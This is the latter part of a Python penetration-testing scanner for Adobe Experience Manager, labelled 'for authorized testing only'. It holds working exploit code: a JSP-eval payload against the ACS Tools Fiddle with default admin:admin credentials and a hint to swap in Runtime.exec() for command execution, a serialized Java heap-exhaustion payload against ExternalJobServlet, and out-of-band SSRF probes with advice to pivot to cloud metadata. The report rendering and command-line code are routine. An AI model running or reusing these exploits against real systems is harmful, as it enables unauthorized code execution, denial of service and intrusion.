        self.logger.section("Nuclei-derived path checks (XSS / exposed servlets)")

        def probe(entry):
            path, words, sev, cat, title = entry
            r = self.client.get(path)
            if r is None or self._is_authwall(r):
                return
            body = r.text or ""
            if not body:
                return
            if all(w in body for w in words):
                self.reporter.add(Finding(
                    title=f"{title} {self._role_tag()}",
                    severity=sev, category=cat, target=self.target + path,
                    evidence="Matched: " + " & ".join(w[:48] for w in words),
                    description=("Detection ported from projectdiscovery/nuclei-templates "
                                 "(AEM set) / Cappricio-Securities/aem-xss. For XSS findings, "
                                 "confirm the payload renders in a browser."),
                    references=["https://github.com/projectdiscovery/nuclei-templates",
                                "https://github.com/Cappricio-Securities/aem-xss"],
                    request=self.client.request_signature("GET", path),
                    response_snippet=snippet(body, 300)))

        with cf.ThreadPoolExecutor(max_workers=self.threads) as ex:
            list(ex.map(probe, NUCLEI_PATH_CHECKS))

    # =======================================================================
    # 19. ACS AEM Tools 'Fiddle' RCE (JSP eval) — ported from aem-hacker
    # =======================================================================
    def check_acs_fiddle(self) -> None:
        if not self._enabled("acs"):
            return
        self.logger.section("ACS AEM Tools Fiddle probe")
        a, b = random.randint(1000, 9999), random.randint(1000, 9999)
        expected = str(a * b)  # appears only if the JSP is EVALUATED (not in source)
        jsp = f"<%= {a} * {b} %>"
        data = "scriptdata=" + up.quote(jsp) + "&scriptext=jsp&resource="
        fiddle_paths = (
            "/etc/acs-tools/aem-fiddle/_jcr_content.run.html",
            "/etc/acs-tools/aem-fiddle/_jcr_content.run.html/a.css",
            "/etc/acs-tools/aem-fiddle/_jcr_content.run.4.2.1...html",
        )
        for p in fiddle_paths:
            for auth in (None, base64.b64encode(b"admin:admin").decode()):
                hdr = {"Content-Type": "application/x-www-form-urlencoded",
                       "Referer": self.client.base_url}
                if auth:
                    hdr["Authorization"] = f"Basic {auth}"
                if self._csrf_token:
                    hdr["CSRF-Token"] = self._csrf_token
                r = self.client.post(p, data=data, headers=hdr)
                if r is not None and r.status_code == 200 and expected in (r.text or ""):
                    who = "admin:admin" if auth else "anonymous"
                    self.reporter.add(Finding(
                        title=f"ACS AEM Tools Fiddle RCE ({who})",
                        severity=SEV_CRITICAL, category=CAT_RCE, target=self.target + p,
                        evidence=f"JSP eval executed: {a}*{b} returned {expected}.",
                        description=("ACS AEM Tools 'Fiddle' is exposed and evaluates attacker JSP "
                                     "server-side — remote code execution. Swap the expression for "
                                     "Runtime.exec() for OS command execution."),
                        references=["https://adobe-consulting-services.github.io/acs-aem-tools/"],
                        request=f"POST {p} (scriptdata=<%= {a} * {b} %>&scriptext=jsp)",
                        response_snippet=snippet(r.text, 200)))
                    return
        # predicates endpoint = ACS tools present (info)
        r = self.client.get("/bin/acs-tools/qe/predicates.json")
        if r is not None and r.status_code == 200 and "relativedaterange" in (r.text or ""):
            self.reporter.add(Finding(
                title=f"ACS AEM Tools present {self._role_tag()}",
                severity=SEV_LOW, category=CAT_EXPOSURE,
                target=self.target + "/bin/acs-tools/qe/predicates.json",
                evidence="ACS Tools predicates endpoint reachable.",
                description="ACS AEM Tools installed; check the Fiddle for RCE with higher privs.",
                references=["https://adobe-consulting-services.github.io/acs-aem-tools/"],
            ))

    # =======================================================================
    # 20. ExternalJobServlet Java deserialization (aggressive -> --exploit)
    # =======================================================================
    def check_externaljob_deser(self) -> None:
        if not self._enabled("deser") or not self.exploit:
            return
        self.logger.section("ExternalJobServlet deserialization probe (--exploit)")
        # oisdos ObjectArrayHeap probe: deser triggers a huge array alloc -> OOM error.
        payload = base64.b64decode("rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////c=")
        for p in ("/libs/dam/cloud/proxy.json", "/libs/dam/cloud/proxy.html",
                  "/libs/dam/cloud/proxy.json;%0aa.css"):
            files = {":operation": (None, "job"),
                     "file": ("jobevent", payload, "application/octet-stream")}
            r = self.client.post(p, files=files, headers={"Referer": self.client.base_url})
            if r is not None and r.status_code == 500 and "Java heap space" in (r.text or ""):
                self.reporter.add(Finding(
                    title=f"ExternalJobServlet Java deserialization {self._role_tag()}",
                    severity=SEV_CRITICAL, category=CAT_RCE, target=self.target + p,
                    evidence="Heap-exhaustion deser probe triggered 'Java heap space' (deserialization confirmed).",
                    description=("ExternalJobServlet deserializes attacker-controlled data. With a "
                                 "gadget chain on the classpath this is RCE. Validate with ysoserial."),
                    references=["https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps"],
                    request=f"POST {p} (multipart :operation=job, file=<java-serialized>)",
                ))
                return

    # =======================================================================
    # 21. Out-of-band SSRF (listener) — ported from aem-hacker
    # =======================================================================
    def check_ssrf_oob(self) -> None:
        if not self._enabled("ssrfoob"):
            return
        collab = self.ssrf_collaborator
        if not (collab or self.ssrf_callback):
            return
        mode = "Burp Collaborator" if collab else "local listener"
        self.logger.section(f"Out-of-band SSRF probes ({mode})")
        rid = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
        base = self.client.base_url
        # Per-servlet callback so a Collaborator/listener hit identifies the servlet.
        for key, method, templates, data_tmpl, cve in SSRF_OOB_SERVLETS:
            if collab:
                # Unique sub-domain per servlet -> the Collaborator interaction's
                # hostname tells you exactly which servlet is vulnerable.
                back = f"http://{key}{rid}.{collab}/"
            else:
                back = f"http://{self.ssrf_callback}/{SSRF_TOKEN}/{key}/{rid}/"
            for tmpl in templates:
                try:
                    path = tmpl.format(cb=back)
                    if method == "GET":
                        self.client.get(path, headers={"Referer": base})
                    else:
                        data = (data_tmpl or "").format(cb=back)
                        self.client.post(path, data=data, headers={
                            "Content-Type": "application/x-www-form-urlencoded", "Referer": base})
                except Exception:
                    pass

        if collab:
            # We cannot poll Burp Collaborator from here (needs the Collaborator
            # client/secret). Report the probes + the subdomain->servlet map so a
            # hit in the Collaborator tab is immediately attributable.
            mapping = ", ".join(f"{key}{rid}.{collab} = {key}"
                                for key, *_ in SSRF_OOB_SERVLETS)
            self.logger.good(f"Fired OOB SSRF probes to *.{collab} — check the Burp Collaborator tab.")
            self.reporter.add(Finding(
                title=f"OOB SSRF probes sent to Burp Collaborator — verify in Collaborator tab {self._role_tag()}",
                severity=SEV_MEDIUM, category=CAT_SSRF, target=self.target,
                evidence=f"Per-servlet payloads fired. Subdomain -> servlet: {mapping}",
                description=("Out-of-band SSRF probes were sent to AEM connector servlets using "
                             "Burp Collaborator payloads (one sub-domain per servlet). Open the "
                             "Collaborator tab: ANY DNS/HTTP interaction from the target confirms "
                             "blind SSRF, and the sub-domain prefix names the vulnerable servlet "
                             "(e.g. a hit on 'salesforcesecret" + rid + "." + collab + "' = "
                             "SalesforceSecretServlet, CVE-2018-5006). Then pivot to internal "
                             "services / cloud metadata and build SSRF->RCE."),
                references=["https://github.com/0ang3el/aem-hacker",
                            "https://portswigger.net/burp/documentation/collaborator"],
            ))
            return

        self.logger.info("Fired SSRF probes; waiting 8s for callbacks...")
        time.sleep(8)
        for key, method, templates, data_tmpl, cve in SSRF_OOB_SERVLETS:
            with SSRF_HITS_LOCK:
                hits = list(SSRF_HITS.get(key, []))
            if hits:
                self.reporter.add(Finding(
                    title=f"Out-of-band SSRF confirmed via {key} {self._role_tag()}",
                    severity=SEV_CRITICAL, category=CAT_SSRF, target=self.target, cve=cve,
                    evidence=f"AEM server called back to the listener ({len(hits)} hit(s)).",
                    description=("Blind SSRF confirmed out-of-band — the AEM server fetched an "
                                 "attacker-controlled URL. Pivot to internal services / cloud "
                                 "metadata, and build SSRF->RCE per 0ang3el's research."),
                    references=["https://github.com/0ang3el/aem-hacker",
                                "https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps"],
                ))

    # =======================================================================
    # Orchestrator
    # =======================================================================
    def run(self) -> None:
        try:
            self.fingerprint()
            self.check_default_credentials()
            self.check_exposed_endpoints()
            self.check_consoles()
            self.check_escalation()
            self.check_dispatcher_bypasses()
            self.check_sling_info_disclosure()
            self.check_querybuilder()
            self.check_groovy_console()
            self.check_ssrf_endpoints()
            self.check_webdav_xxe()
            self.check_cve_2025_54253()
            self.check_legacy_cves()
            self.check_modern_cves()
            self.check_sling_post_servlet()
            self.check_anonymous_user_create()
            self.check_source_disclosure()
            self.check_osgi_consoles_extended()
            self.check_aemhacker_servlets()
            self.check_nuclei_paths()
            self.check_acs_fiddle()
            self.check_externaljob_deser()
            self.check_ssrf_oob()
            self.check_open_redirect()
            self.check_querybuilder_injection()
            self.check_graphql_introspection()
            self.check_webdav_methods()
            self.check_misc()
        except KeyboardInterrupt:
            self.logger.warn("Interrupted by user; producing report with partial findings.")
        finally:
            # Report-ready one-line verdict for the anonymous scan.
            try:
                self._emit_access_summary()
            except Exception as e:
                self.logger.debug(f"access summary failed: {e}")


# ---------------------------------------------------------------------------
# HTML report rendering
# ---------------------------------------------------------------------------
HTML_STYLE = """
* { box-sizing: border-box; }
body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", system-ui, sans-serif;
  background: #0d1117; color: #c9d1d9; padding: 24px;
  max-width: 1200px; margin: 0 auto; line-height: 1.5;
}
h1 { color: #58a6ff; margin-bottom: 4px; }
.target { color: #8b949e; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
.summary { display: flex; gap: 12px; margin: 18px 0; flex-wrap: wrap; }
.card { padding: 10px 16px; border-radius: 6px; font-weight: 600; font-size: 13px; }
.c-CRITICAL { background: #6f1d1f; color: #ffe2dc; }
.c-HIGH { background: #7d2a1e; color: #ffd1c4; }
.c-MEDIUM { background: #745c00; color: #f7e1a1; }
.c-LOW { background: #1f4d6b; color: #c8ecff; }
.c-INFO { background: #2a2f3a; color: #aab2c5; }
.finding {
  background: #161b22; border: 1px solid #30363d; border-radius: 8px;
  padding: 16px 18px; margin: 12px 0;
}
.finding h3 { margin: 0 0 4px 0; color: #f0f6fc; }
.meta { color: #8b949e; font-size: 13px; margin: 6px 0; }
.badge {
  display: inline-block; padding: 2px 8px; border-radius: 4px;
  font-size: 11px; margin-right: 6px; font-weight: 600;
}
.b-CRITICAL { background: #6f1d1f; color: #ffadad; }
.b-HIGH { background: #7d2a1e; color: #ffc4b3; }
.b-MEDIUM { background: #745c00; color: #f7e1a1; }
.b-LOW { background: #1f4d6b; color: #b6e1ff; }
.b-INFO { background: #2a2f3a; color: #aab2c5; }
.b-cve { background: #4d1c1c; color: #ffadad; }
.b-cat { background: #1f3a5f; color: #b6e1ff; }
.b-role { background: #2f4a1f; color: #c9ecb5; }
pre {
  background: #0d1117; border: 1px solid #30363d; padding: 10px;
  border-radius: 4px; overflow-x: auto; font-size: 12px;
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  white-space: pre-wrap; word-break: break-word;
}
a { color: #58a6ff; text-decoration: none; }
a:hover { text-decoration: underline; }
.foot { color: #8b949e; font-size: 12px; margin-top: 36px;
        border-top: 1px solid #30363d; padding-top: 12px; }
"""


def render_html_report(target: str, findings: List[Finding], summary: Dict[str, int]) -> str:
    sev_cards = "".join(
        f'<div class="card c-{sev}">{sev}: {count}</div>'
        for sev, count in sorted(summary.items(), key=lambda kv: -SEV_ORDER.get(kv[0], 0))
    )

    cards_html: List[str] = []
    for f in findings:
        refs_html = ""
        if f.references:
            refs_html = "<div class='meta'>Refs: " + " &middot; ".join(
                f'<a href="{html_mod.escape(r)}" target="_blank" rel="noopener">{html_mod.escape(r)}</a>'
                for r in f.references) + "</div>"
        cve_badge = (f'<span class="badge b-cve">{html_mod.escape(f.cve)}</span>'
                     if f.cve else "")
        req_block = (f'<div class="meta">Request</div><pre>{html_mod.escape(f.request)}</pre>'
                     if f.request else "")
        resp_block = (f'<div class="meta">Response snippet</div><pre>{html_mod.escape(f.response_snippet)}</pre>'
                      if f.response_snippet else "")
        ev_block = (f'<div class="meta">Evidence</div><pre>{html_mod.escape(f.evidence)}</pre>'
                    if f.evidence else "")
        desc_block = (f'<p>{html_mod.escape(f.description)}</p>' if f.description else "")
        cards_html.append(
            f'<div class="finding">'
            f'<h3>{html_mod.escape(f.title)}</h3>'
            f'<div class="meta">'
            f'<span class="badge b-{f.severity}">{f.severity}</span>'
            f'<span class="badge b-cat">{html_mod.escape(f.category)}</span>'
            f'{cve_badge}'
            f'</div>'
            f'<div class="meta">Target: <code>{html_mod.escape(f.target)}</code></div>'
            f'{desc_block}{ev_block}{req_block}{resp_block}{refs_html}'
            f'</div>'
        )

    body = (
        f'<h1>AEM Hunter Report</h1>'
        f'<div class="target">Target: {html_mod.escape(target)}</div>'
        f'<div class="target">Generated: {dt.datetime.now().isoformat(timespec="seconds")}</div>'
        f'<div class="summary">{sev_cards}</div>'
        f'{"".join(cards_html) or "<p>No findings.</p>"}'
        f'<div class="foot">aem-hunter v{VERSION} &middot; for authorized testing only.</div>'
    )

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>AEM Hunter Report - {html_mod.escape(target)}</title>
<style>{HTML_STYLE}</style>
</head>
<body>
{body}
</body>
</html>"""


# ---------------------------------------------------------------------------
# Reporting outputs
# ---------------------------------------------------------------------------
def write_reports(target: str, findings: List[Finding], summary: Dict[str, int],
                  output_dir: str, logger: Logger, label: Optional[str] = None) -> List[str]:
    os.makedirs(output_dir, exist_ok=True)
    ts = dt.datetime.now().strftime("%Y%m%d-%H%M%S")
    host = short_host(target)
    lbl = ""
    if label:
        lbl = "-" + re.sub(r"[^a-z0-9]+", "-", label.lower()).strip("-")
    base = os.path.join(output_dir, f"report-{host}{lbl}-{ts}")
    json_path = base + ".json"
    html_path = base + ".html"

    with open(json_path, "w") as fh:
        json.dump({
            "tool": "aem-hunter",
            "version": VERSION,
            "target": target,
            "scan": label or "unauthenticated",
            "generated": dt.datetime.now().isoformat(timespec="seconds"),
            "summary": summary,
            "findings": [asdict(f) for f in findings],
        }, fh, indent=2)
    logger.good(f"JSON report: {json_path}")

    with open(html_path, "w") as fh:
        fh.write(render_html_report(target, findings, summary))
    logger.good(f"HTML report: {html_path}")
    return [json_path, html_path]


# ---------------------------------------------------------------------------
# Single unauthenticated scan. Takes a URL, returns the report paths.
# ---------------------------------------------------------------------------
def run_one_scan(target: str, proxy: Optional[str], output_dir: str, logger: Logger,
                 exploit: bool = False, use_http2: bool = False,
                 fuzz_aggression: str = "normal",
                 ssrf_callback: Optional[str] = None,
                 ssrf_collaborator: Optional[str] = None) -> List[str]:
    label = "unauthenticated"
    logger.section(f"SCAN: {label}")
    reporter = Reporter(logger)

    # ---- Preflight: is the target even reachable from here? ----
    pre = HttpClient(base_url=target, timeout=15, proxy=proxy, threads=2,
                     verify=False, rate_limit=0.0, logger=logger, use_http2=use_http2)
    rp = pre.get("/") or pre.get("/libs/granite/core/content/login.html") or pre.get("/system/console")
    if rp is None:
        err = pre.last_error or "no response"
        logger.err(f"TARGET UNREACHABLE: {err}")
        if "HTTP/2" in err or "UnknownProtocol" in err or "ProtocolError" in err:
            logger.err("CAUSE: the target speaks HTTP/2, which Python 'requests' cannot. Fix EITHER:")
            logger.err("  A) Route through Burp/mitmproxy (it downgrades h2->h1.1):")
            logger.err("       --proxy http://127.0.0.1:8080")
            logger.err("  B) Use the native HTTP/2 backend (no proxy needed):")
            logger.err("       pip install 'httpx[http2]'  then add  --http2")
            if not _HAS_HTTPX:
                logger.err("     (httpx is not currently installed, so --http2 needs the pip install first)")
        else:
            logger.err("Likely causes:")
            logger.err("  1. Network/VPN to the target is down, or the host is offline.")
            logger.err("  2. You normally egress through Burp — pass --proxy http://127.0.0.1:8080.")
            logger.err("  3. A WAF/IPS blocked your source IP. Confirm with:")
            logger.err(f"        curl -k -I {target}/")
        logger.err("Re-run with -v to see the exact per-request error.")
        return []
    logger.good(f"target reachable -> HTTP {rp.status_code} "
                f"(backend={pre.backend}{'/h2' if pre.backend == 'httpx' else ''})")

    client = HttpClient(
        base_url=target, timeout=15, proxy=proxy, threads=10,
        verify=False, rate_limit=0.0, logger=logger, use_http2=use_http2,
    )

    hunter = AEMHunter(
        target=target, logger=logger, reporter=reporter, client=client,
        threads=10, enable_modules=None, fuzz_aggression=fuzz_aggression,
        exploit=exploit, ssrf_callback=ssrf_callback,
    )
    hunter.ssrf_collaborator = ssrf_collaborator
    hunter.run()

    summary = reporter.summary()
    logger.section(f"Summary")
    for sev in (SEV_CRITICAL, SEV_HIGH, SEV_MEDIUM, SEV_LOW, SEV_INFO):
        logger.finding(sev, f"{summary.get(sev, 0)} {sev}")
    return write_reports(target, reporter.by_severity(), summary, output_dir, logger, label=label)


# ---------------------------------------------------------------------------
# CLI — minimal: just a URL. Everything else has a sane default.
# ---------------------------------------------------------------------------
def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="aem_hunter.py",
        description="Unauthenticated Adobe Experience Manager security scanner. "
                    "Point it at a URL and it runs every known check in depth.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Examples:
              python3 aem_hunter.py                          # prompts for URL
              python3 aem_hunter.py https://aem.example.com
              python3 aem_hunter.py -u TARGET --proxy http://127.0.0.1:8080
              python3 aem_hunter.py -u TARGET --aggressive   # bigger dispatcher fuzz
              python3 aem_hunter.py -u TARGET --http2        # for HTTP/2-only targets
              python3 aem_hunter.py -u TARGET --exploit      # also try the JSP-RCE PoC

            The scanner only runs unauthenticated checks. No cookies, no auth, no
            role concept — just a URL and every well-known AEM vulnerability test.

            By default, escalation modules CONFIRM capabilities safely (create-then-
            delete throwaway artifacts on writable paths). Add --exploit to also
            try the end-to-end JSP RCE PoC (drops & removes a canary JSP). Only
            use --exploit on systems you are authorized to actively exploit.
            """),
    )
    p.add_argument("target", nargs="?", help="Target URL (e.g. https://aem.example.com)")
    p.add_argument("-u", "--url", help="Target URL (same as the positional argument)")
    p.add_argument("--proxy", help="Route through a proxy, e.g. http://127.0.0.1:8080 (optional)")
    p.add_argument("--http2", action="store_true",
                   help="Use the native HTTP/2 backend (httpx) for targets that only speak "
                        "HTTP/2. Needs: pip install 'httpx[http2]'. Avoids needing a downgrading proxy.")
    p.add_argument("-o", "--output-dir", default=".", help="Where to write reports (default: current dir)")
    p.add_argument("--aggressive", action="store_true",
                   help="Use the extended dispatcher-bypass / Sling-selector payload set "
                        "(~10x more requests; finds edge-case bypasses missed by the default fuzz).")
    p.add_argument("--exploit", action="store_true",
                   help="Enable destructive end-to-end PoCs: JSP RCE (drops+removes a canary), "
                        "ExternalJob deserialization probe. Authorized only.")
    p.add_argument("--collaborator", metavar="DOMAIN",
                   help="Enable out-of-band SSRF checks via Burp Collaborator (recommended). "
                        "DOMAIN is your Collaborator payload host (e.g. abc123.oastify.com). The "
                        "tool fires one sub-domain per servlet; check the Collaborator tab — a hit "
                        "names the vulnerable servlet. Works with --proxy through Burp.")
    p.add_argument("--ssrf-callback", metavar="HOST:PORT",
                   help="Alternative OOB SSRF: HOST:PORT of a tester-reachable host; a local "
                        "listener is started on PORT and auto-confirms callbacks. Use when you "
                        "have a public IP (won't work behind a forward proxy like Burp).")
    p.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    p.add_argument("--version", action="version", version=f"aem-hunter {VERSION}")
    return p.parse_args()


def main() -> int:
    ns = parse_args()
    logger = Logger(verbose=ns.verbose)
    print(BANNER.format(ver=VERSION))

    target = ns.url or ns.target
    if not target:
        try:
            target = input("Target URL (e.g. https://aem.example.com): ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return 1
    if not target:
        logger.err("No target URL provided.")
        return 2
    target = normalize_target(target)

    proxy = ns.proxy
    output_dir = ns.output_dir or "."
    fuzz_aggression = "aggressive" if ns.aggressive else "normal"

    logger.info(f"Target: {target}")
    if proxy:
        logger.info(f"Proxy: {proxy}")
    if ns.http2:
        if _HAS_HTTPX:
            logger.info("HTTP/2 backend: ON (httpx)")
        else:
            logger.warn("--http2 set but httpx is not installed. Run: pip install 'httpx[http2]'")
    if ns.aggressive:
        logger.info("Aggressive mode: ON (extended dispatcher fuzz, longer scan)")
    if ns.exploit:
        logger.warn("--exploit ON: will attempt JSP RCE PoC (with cleanup). "
                    "Authorized targets only.")
    ssrf_callback = None
    ssrf_collaborator = None
    if ns.collaborator:
        ssrf_collaborator = re.sub(r"^https?://", "", ns.collaborator.strip()).strip("/")
        logger.info(f"OOB SSRF via Burp Collaborator: *.{ssrf_collaborator} "
                    "(watch the Collaborator tab)")
    elif ns.ssrf_callback:
        ssrf_callback = ns.ssrf_callback.strip()
        try:
            bind_port = int(ssrf_callback.rsplit(":", 1)[1])
        except (IndexError, ValueError):
            logger.err("--ssrf-callback must be HOST:PORT (e.g. 1.2.3.4:8000)")
            return 2
        if start_ssrf_listener(bind_port, logger) is None:
            ssrf_callback = None
        else:
            logger.info(f"OOB SSRF callback: http://{ssrf_callback}/ (target must reach this)")
    print()

    try:
        reports = run_one_scan(target, proxy, output_dir, logger,
                               exploit=ns.exploit, use_http2=ns.http2,
                               fuzz_aggression=fuzz_aggression,
                               ssrf_callback=ssrf_callback,
                               ssrf_collaborator=ssrf_collaborator)
    except KeyboardInterrupt:
        logger.warn("Scan interrupted by user.")
        return 130

    if reports:
        logger.section("Reports written")
        for pth in reports:
            logger.good(pth)
    else:
        logger.warn("No report produced.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
